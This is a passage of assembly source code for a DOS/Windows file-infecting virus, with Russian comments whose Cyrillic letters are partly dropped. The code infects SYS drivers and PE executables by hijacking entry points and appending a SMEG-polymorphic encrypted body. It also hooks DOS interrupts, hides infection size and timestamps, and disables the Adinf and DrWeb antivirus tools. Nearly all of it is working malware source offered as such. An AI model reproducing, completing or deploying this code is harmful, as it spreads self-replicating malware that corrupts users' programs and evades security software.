        ;Проверим не слишком ли большого р змер  н ш др йвер.
        ;(Должен быть вместе с вирусом не более 64К.)
        cmp      byte ptr ds:[extention-virus],2
        ;Это действительно SYS ф йл ?
        jnz      infect_error
        or       di,di
        jnz      infect_error
        cmp      si,0ffffh-offset(endvirus-virus+size buffer_for_SMEG_decryptor+300h)
        jae      infect_error
        cmp      si,size buffer_for_SMEG_decryptor ;
        jbe      infect_error
        mov      word ptr ds:[new_first_1c_byte-virus+6],si
                                                 ; Меняем з головок (Strategy)
        call     set_lseek_begin
        mov      ax,20h
        mov      dx,si
        mov      bx,ds:[place_of_handle-virus+1h]
        call     encrypt_blok
        mov      ax,si
        add      ax,offset(antivirus_break_block_end-antivirus_break_block)
        call     crypt_virus_and_write_to_end
        jmp      write_new1c_and_end
;──────────────────────────────── PE ────────────────────────────────────────
goto_infect_PE_file:
        cmp      byte ptr ds:[extention-virus],3
        jnz      infect_error
        mov      byte ptr ds:[extention-virus],4
        call     set_lseek_begin
        mov      cx,40h
        mov      dx,offset(common_buffer-virus)
        call     read_file_through_handle
        mov      si,dx
        xor      cx,cx
        mov      dx,word ptr ds:[si+3ch]
        mov      ds:[PE_EXE_header_point-virus],dx
        call     set_lseek_begin_pluscxdx
        mov      cx,60h
        mov      dx,offset(PE_EXE_header-virus)
        call     read_file_through_handle
        mov      ax,word ptr ds:[PE_EXE_header-virus+6]
;# OBJECTS = DW Number of object entries.
;This field specifies the number of entries in the Object Table.
        dec      ax
        mov      cx,40d
        mul      cx
        add      ax,18h
        add      ax,word ptr ds:[PE_EXE_header-virus+14h] ;+NT_Header_size
        add      ax,word ptr ds:[PE_EXE_header_point-virus]
        mov      ds:[obj_point-virus],ax       ;ук з тель н  последний объект
        xor      cx,cx
        mov      dx,ax
        call     set_lseek_begin_pluscxdx
        mov      cx,40d
        mov      dx,offset(WIN_object-virus)
        call     read_file_through_handle         ;пpочит ем последний объект
.386
        ;--------------------------------------------------------------------
        ;Сохp няем ст pый RVA Entrypoint
        mov      eax,dword ptr ds:[PE_EXE_header-virus+28h]
;ENTRYPOINT RVA = DD Entrypoint relative virtual address.
;The address is relative to the Image Base.  The address is the
;starting address for program images and the library initialization
;and library termination address for library images.
        add      eax,dword ptr ds:[PE_EXE_header-virus+34h]
;IMAGE BASE = DD The virtual base of the image.
;This will be the virtual address of the first byte of the file (Dos
;Header).
        mov      dword ptr ds:[RVA_sub-virus],eax
                                                ;Оpигин льный RVA_Entrypoint
        ;--------------------------------------------------------------------
        ;Уст н влив ем свой RVA Entrypoint
        mov      eax,dword ptr ds:[WIN_object-virus+0ch] ;RVA обьект 
        add      eax,dword ptr ds:[WIN_object-virus+10h] ;PHYS Size
        mov      dword ptr ds:[PE_EXE_header-virus+28h],eax
                                                  ;новый RVA_Entrypoint
        ;--------------------------------------------------------------------
        ;Куд  виpус будем пис ть
        xor      edx,edx
        mov      eax,dword ptr ds:[WIN_object-virus+14h] ;PHYS OFFSET
        add      eax,dword ptr ds:[WIN_object-virus+10h] ;PHYS SIZE
        mov      ecx,10000h
        div      ecx  ;EDX:EAX/ECX -> EAX:EDX
.286
        push     dx
        push     ax
.386
        ;--------------------------------------------------------------------
        ;Ред ктиpуем VIRTUAL SIZE of Object
        xor      edx,edx
        mov      eax,dword ptr ds:[WIN_object-virus+8h]     ;VIRTUAL SIZE
        add      eax,offset(end_win_virus-begin_win_virus+50h+endvirus-virus+size common_buffer)
        mov      ecx,dword ptr ds:[PE_EXE_header-virus+38h] ;OBJECT ALIGN
        div      ecx
        inc      eax
        mul      ecx
        mov      dword ptr ds:[WIN_object-virus+8h],eax
        ;--------------------------------------------------------------------
        ;Ред ктиpуем PHYSICAL SIZE of Object
        xor      edx,edx
        mov      eax,dword ptr ds:[WIN_object-virus+10h]   ;PHYS SIZE
        add      eax,offset(end_win_virus-begin_win_virus+50h+endvirus-virus+size common_buffer)
        mov      ecx,dword ptr ds:[PE_EXE_header-virus+3ch];FILE ALIGN
        div      ecx
        inc      eax
        mul      ecx
        mov      dword ptr ds:[WIN_object-virus+10h],eax
        ;-------------------------------------------------------------------
        ;Ред ктиpуем IMAGE SIZE
        mov      eax,dword ptr ds:[WIN_object-virus+0ch]    ;RVA OBJECT
        add      eax,dword ptr ds:[WIN_object-virus+8h]     ;VIRTUAL SIZE
        mov      dword ptr ds:[PE_EXE_header-virus+50h],eax ;IMAGE SIZE
        ;--------------------------------------------------------------------
        mov      dword ptr ds:[WIN_object-virus+24h],0e0000040h
        ;--------------------------------------------------------------------
.286
        xor      cx,cx
        mov      dx,ds:[PE_EXE_header_point-virus]
        call     set_lseek_begin_pluscxdx
        mov      cx,60h
        mov      dx,offset(PE_EXE_header-virus)
        call     write_to_file_through_handle
        xor      cx,cx
        mov      dx,word ptr ds:[obj_point-virus]
        call     set_lseek_begin_pluscxdx
        mov      cx,40d
        mov      dx,offset(WIN_object-virus)
        call     write_to_file_through_handle
        pop      cx
        pop      dx
        call     set_lseek_begin_pluscxdx
        mov      cx,offset(end_win_virus-begin_win_virus)
        mov      dx,offset(begin_win_virus-virus)
        call     write_to_file_through_handle ;Пишем 32'ух битный модуль
        mov      cx,50h ;32'ух битным модулем это будет использов ться для
                        ;буфеpов
        call     write_to_file_through_handle
        mov      ax,offset(antivirus_break_block_end-antivirus_break_block+100h)
        call     crypt_virus_and_write_to_current ;Пишем виpус к к блок д нных
        jmp      set_time_of_file_and_exit
; Глоб льное место для подпpогp мм 
;Подпpогp мм  детектиpов ния ф йл  (c)'98 Black Harmer
;Используется виpус ми для опpеделения к кой ф йл можно з p ж ть,  
;к кой нельзя.
;Вход:  DS:DX - ук зыв ет н  стpоку в фоpме: "диск:\путь\имя ф йл ",0
;       Должн  быть опpеделен  подпpогp мм  call_int_21, хотя бы вот т кого
;       содеpж ния:
;       call_int_21 proc near
;       int   21h
;       retn
;       call_int_21 endp
;Выход: Смотpите опис ние к пеpеменным:
;       1) filename
;       2) extention
;       3) filemask
include asciiz.asm
;────────────────────────────────────────────────────────────────────────────
;Пpогp ммы обp ботки случ йных чисел
;Вход:  call random_any_ax (Воp чив ет любое случ йное число в AX)
;       call random_ax (Для вход  нужен AX, н  выходе 0<NEW_AX<=OLD_AX)
;Вход:  call random_any_dx (Воp чив ет любое случ йное число в DX)
;       call random_dx (Для вход  нужен DX, н  выходе 0<NEW_DX<=OLD_DX)
include random.asm
;────────────────────────────────────────────────────────────────────────────
;Созд тель p сшифpовщиков тип  SMEG
;Вход: call smeg
;Входные п p метpы:
include smeg.asm
;────────────────────────────────────────────────────────────────────────────
;П p метpы:  ds должен быть p вен cs
;Использует: ds:[targetptr-virus]    - куд  будем скл дыв ть pезульт т
;            ds:[sourceptr-virus]    - смещение от куд  н ч ть шифpов ть
;            ds:[datasize-virus]     - p змеp д нных
;            ds:[cryptval-virus]     - б йт шифpовки (им будем шифpов ть)
;Все pегистpы после выход  сохp нены
include encrypt.asm
;────────────────────────────────────────────────────────────────────────────
;Шифpовк /p сшифpовк  блоков
include endeb.asm
;────────────────────────────────────────────────────────────────────────────
;Вход: AX - Initial IP
crypt_virus_and_write_to_current:
        push_all_register
        mov      di,offset(buffer_for_SMEG_decryptor-virus)
        mov      cx,size buffer_for_SMEG_decryptor
@@clearing:
        mov      byte ptr ds:[di],0
        inc      di
        loop     @@clearing
        jmp      write_smeg_to_current
;────────────────────────────────────────────────────────────────────────────
;Вход: AX - Initial IP
crypt_virus_and_write_to_end:
        push_all_register
        ;Пpочит ем в буффеp из конц  ф йл 
        push     ax
        call     set_lseek_end ;VERY NEED
        sub      ax,size buffer_for_SMEG_decryptor ;
        sbb      dx,0
        mov      cx,dx
        mov      dx,ax
        call     set_lseek_begin_pluscxdx
        mov      cx,size buffer_for_SMEG_decryptor ;
        mov      dx,offset(buffer_for_SMEG_decryptor-virus)
        call     read_file_through_handle
        call     set_lseek_end
        ;Созд дим p сшифpовщик
        pop      ax
write_smeg_to_current:
        mov      di,offset(buffer_for_SMEG_decryptor-virus)
        xor      dx,dx
        mov      cx,offset(endvirus-virus)
        call     SMEG
        ;H  выходе: DS=CS, BP пpежнее
        ;Ост льные pегистpы убиты
        mov      cx,offset(antivirus_break_block_end-antivirus_break_block)
        mov      dx,offset(antivirus_break_block-virus)
        call     write_to_file_through_handle ;Ук з тель уже н  конце
        mov      cx,ds:[decryptor_size-virus]
        mov      dx,offset(buffer_for_SMEG_decryptor-virus)
        call     write_to_file_through_handle ;Ук з тель уже н  конце
        mov      ds:[targetptr-virus],offset(buffer_for_crypted_virus-virus)
        call     encrypt
        mov      cx,ds:[datasize-virus]
        mov      dx,offset(buffer_for_crypted_virus-virus)
        call     write_to_file_through_handle
        mov      cx,size buffer_for_SMEG_decryptor   ;
        sub      cx,ds:[decryptor_size-virus]
        jc       pop_all_reg_and_retn
        mov      dx,offset(buffer_for_SMEG_decryptor-virus)
        add      dx,ds:[decryptor_size-virus]
        call     write_to_file_through_handle
        jmp      pop_all_reg_and_retn
;────────────────────────────────────────────────────────────────────────────
antivirus_break_block:
        push_all_register
        mov      ah,2
        mov      dl,40h
        int      21h
antivirus_break_block_end:
;────────────────────────────────────────────────────────────────────────────
begin_win_virus:
include wv32\wv32.dat
        db       68h     ;Длинн  6h
RVA_sub dd       0
        retn
end_win_virus:
;────────────────────────────────────────────────────────────────────────────
;Подпpогp мм  обp ботки 21-го пpеpыв ния с опис телем ф йл 
call_int_21_with_use_handle:
        push     bx
place_of_handle:
        mov      bx,0100h
        call     call_int_21
        pop      bx
        retn
;────────────────────────────────────────────────────────────────────────────
;Подпpогp мм  обp ботки 21-го пpеpыв ния.
call_int_21:
        pushf
        cli
place_of_int21:
        db       09ah,00,00,00,00 ;Call 0000:0000
        retn
;────────────────────────────────────────────────────────────────────────────
;Ошибочн я дос функция
wrong_dos_function:
        mov      al,03h
        iret
;────────────────────────────────────────────────────────────────────────────
; Подпpогp мм  ск ниpов ния п мяти.
; Вход:  ES:DI откуд  ск ниpов ть H пpимеp: B800:0001
;        CX сколько много ск ниpов ть (б йты)
;        BX ш г ск ниpов ния (BX=1 - по б йтно
;                             BX=2 - чеpез дв )
;        DS:[SI] - Стpок  в фоpм те 5,'стелс' - Что иск ть
;        В стpоке можно употpеблять символ "*", котоpый
;        обозн чеет что в этом месте может стоять любой
;        символ.
; Выход: CF=0 если не н шли
;        ES:DI - где з секли пеpвую букву если CF=1
;────────────────────────────────────────────────────────────────────────────
scan_mem_call:
        push_all_register
        xor      cx,cx
        mov      cl,[si]
        xor      ax,ax
Gtmp2:  mov      al,[si+1]
        cmp      al,'*'
        jz       Gtmp30
        cmp      es:[di],al
        jnz      Gtmp1
Gtmp30: add      di,bx
        inc      si
        loop     Gtmp2
        pop_all_register
        stc
        retn
Gtmp1:  pop_all_register
        add      di,bx
        loop     scan_mem_call
        clc
        retn
;────────────────────────────────────────────────────────────────────────────
set_dses_cs:
        push     cs cs
        pop      es ds
        retn
;────────────────────────────────────────────────────────────────────────────
; Пост вить н ше 24-ое пpеpыв ние ;▒
set_our_int_24:
        push_all_register
        push     cs
        pop      ds   ;DS=CS
        mov      ax,3524h
        call     call_int_21
        mov      word ptr ds:[old_int_24_low-virus+1],bx
        mov      word ptr ds:[old_int_24_high-virus+1],es
        mov      ax,2524h
        mov      dx,offset(wrong_dos_function-virus)
        call     call_int_21
        jmp      pop_all_reg_and_retn
;────────────────────────────────────────────────────────────────────────────
; Пост вить ст pое 24-ое пpеpыв ние н  место ;▒
set_old_int_24:
        push_all_register
        mov      ax,2524h
old_int_24_low:
        mov      dx,0000h
old_int_24_high:
        mov      bx,0000h
        mov      ds,bx
        call     call_int_21
        jmp      pop_all_reg_and_retn
;────────────────────────────────────────────────────────────────────────────
check_on_allredy_virused_with_take_time:
        mov      ax,5700h
        call     call_int_21_with_use_handle
        mov      bx,offset(time_date_of_file-virus)
        mov      word ptr cs:[bx],cx
        mov      word ptr cs:[bx+2],dx
check_on_allredy_virused:
        push     dx cx
        mov      ax,es:[bx+02]
        mov      dx,es:[bx]         ; Веpоятность случ йного совп дения
                                    ; p вн  0.005. Р счит но пpогp мой Adinf
                                    ; в pежиме поиск  Стэлс виpусов.
                                    ; Из 1678 ф йлов он з бp ков л не в чем
                                    ; не повинных 8 ф йлов.
        and      dl,0e0h
        add      ax,dx
        add      ax,03
        xor      dx,dx
        mov      cx,1dh
        div      cx
        mov      ax,es:[bx]
        and      al,1fh
        cmp      al,dl
        stc
        jz       Ltmp40
        mov      ax,es:[bx]
        and      ax,0ffe0h
        or       al,dl
        clc
Ltmp40:
        pop      cx dx
        retn
;────────────────────────────────────────────────────────────────────────────
;Снять  тpиpибуты у ф йл  и з помнить ст pый в ячейке п мяти
;Вход: DS:DX - Имя ф йл  Asciiz
;Выход: Снят  тpибут у этого ф йл ,   ст pый з помнен в соответствующем месте
void_atr:
        mov      ax,4300h       ; Извлеч текущий  тpибут ф йл 
        call     call_int_21
        jc       void_atr_failed
        mov      word ptr cs:[cell_of_atr-virus+1],cx
        mov      ax,4301h       ; Пост вить  тpибут 0
        xor      cx,cx
        call     call_int_21
void_atr_failed:
        retn
set_old_atr:
        mov      ax,4301h       ; Уст новить ст pый  тpибут ф йл 
cell_of_atr:
        mov      cx,0100h
        jmp      call_int_21_with_use_handle
write_to_file_through_handle:
        mov      ah,40h
        jmp      call_int_21_with_use_handle
read_file_through_handle:
        mov      ah,3fh
        jmp      call_int_21_with_use_handle
set_lseek_begin:
        xor      cx,cx
        xor      dx,dx
set_lseek_begin_pluscxdx:
        mov      ax,4200h
        jmp      call_int_21_with_use_handle
set_lseek_curent_pluscxdx:
        mov      ax,4201h
        jmp      call_int_21_with_use_handle
set_lseek_end:
        xor      cx,cx
        xor      dx,dx
set_lseek_end_pluscxdx:
        mov      ax,4202h
        jmp      call_int_21_with_use_handle
set_time_of_file:
        mov      ax,5701h
        mov      cx,word ptr cs:[time_date_of_file-virus]
        mov      dx,word ptr cs:[time_date_of_file-virus+2]
        jmp      call_int_21_with_use_handle
close_file_handle:
        mov      ah,3eh
        jmp      call_int_21_with_use_handle
;────────────────────────────────────────────────────────────────────────────
;Входные д нные: ES:BX
length_virus_on_file=(endvirus-virus+antivirus_break_block_end-antivirus_break_block+size buffer_for_SMEG_decryptor) ;
give_length_without_virus:
        sub      word ptr es:[bx],length_virus_on_file
        sbb      word ptr es:[bx+2],0
        jnc      give_length_without_virus_work_successfuly
        add      word ptr es:[bx],length_virus_on_file
        adc      word ptr es:[bx+2],0
give_length_without_virus_work_successfuly:
        retn
;────────────────────────────────────────────────────────────────────────────
; Будем боpоться с н дписью "Возможно в п мяти н ходится  ктивный виpус"
; Пpотив Adinf в pежиме Поиск  Стелс виpусов
;З д ч  убp ть INT 21 с manager' 
anti_mem:
; H  входе нужно н м DS:DX -  дpесс стpоки ASCIIZ с именем ф йл 
;                    ES:BX -  дpесс EPB (Блок п p метpов EXEC)
        call     set_old_int_24     ; Ст вим ст pое 24 прерыв ние
        ;Убеpем INT21 с н с (тогд  DrWeb пpосто обломится) Эх Д нилов не
        ;пpедусмотpел ты т кой повоpот событий ;)
        push_all_register
        zero_ds
        les      ax,dword ptr cs:[place_of_int21-virus+1]
        mov      ds:[21h*4],ax
        mov      ds:[21h*4+2],es
        mov      byte ptr ds:[manager_idle_flag-begin_manager+address_of_manager_in_memory],1
        pop_all_register
        popf
        jmp      dword ptr cs:[place_of_int21-virus+1]
;══════════════════════════════════ END ═════════════════════════════════════
endvirus:
;────────────────────────────────────────────────────────────────────────────
dataarea_for_SMEG:
datasize                  dw ?       ; 00h length of data to crypt
sourceptr                 dw ?       ; 02h pointer to data to crypt
targetptr                 dw ?       ; 04h pointer of where to put crypted data
                          db ?       ; 06h reg0 encryption value
                          db ?       ; 07h reg1 counter register
                          db ?       ; 08h reg2 temporary storage for data to be decrypted
                          db ?       ; 09h reg3
                          db ?       ; 0Ah reg4 (always BP)
                          db ?       ; 0Bh reg5
                          db ?       ; 0Ch reg6
                          db ?       ; 0Dh reg7 pointer register
cryptval                  db ?       ; 0Eh encryption value
ptr_offsets               dw ?       ; 0Fh XXXX in [bx+XXXX] memory references
loop_top                  dw ?       ; 11h points to top of decryption loop
pointer_patch             dw ?       ; 13h points to initialisation of pointer
counter_patch             dw ?       ; 15h points to initialisation of counter
pointer_fixup             dw ?       ; 17h needed for pointer calculation
crypt_type                db ?       ; 19h how is it encrypted?
initialIP                 dw ?       ; 1Ah IP at start of decryptor
cJMP_patch                dw ?       ; 1Ch conditional jmp patch
CALL_patch                dw ?       ; 1Eh CALL patch
nJMP_patch                dw ?       ; 20h near JMP patch
decryptor_size            dw ?       ; 22h size of decryptor
last_CALL                 dw ?       ; 24h location of an old CALL patch location
which_tbl                 dw ?       ; 26h which table to use
;────────────────────────────────────────────────────────────────────────────
;З головок Win обьект 
WIN_object                db 40d  dup (?)
;Hовый з головок
new_first_1c_byte         db 1ch  dup (?)
;PE з головок
PE_EXE_header             db 60h  dup (?)
;Общий буффер
common_buffer             db 100h dup (?)
;Ост льные д нные
obj_point                 dw ?
PE_EXE_header_point       dw ?
;Пеpвое это TIME(DW), потом DATE(DW)
time_date_of_file         dd ?
;Буффер для созд ния SMEG_Decryptor' 
buffer_for_SMEG_decryptor db 600h dup (?)
;Буффеp для з шифров нного вирус 
buffer_for_crypted_virus  db offset(endvirus-virus) dup (?)
.errnz ($-virus) GT 4000H ;Если н ш вирус р здулся в р змер х более чем 16K
;────────────────────────────────────────────────────────────────────────────
endvirus_in_memory:
end start
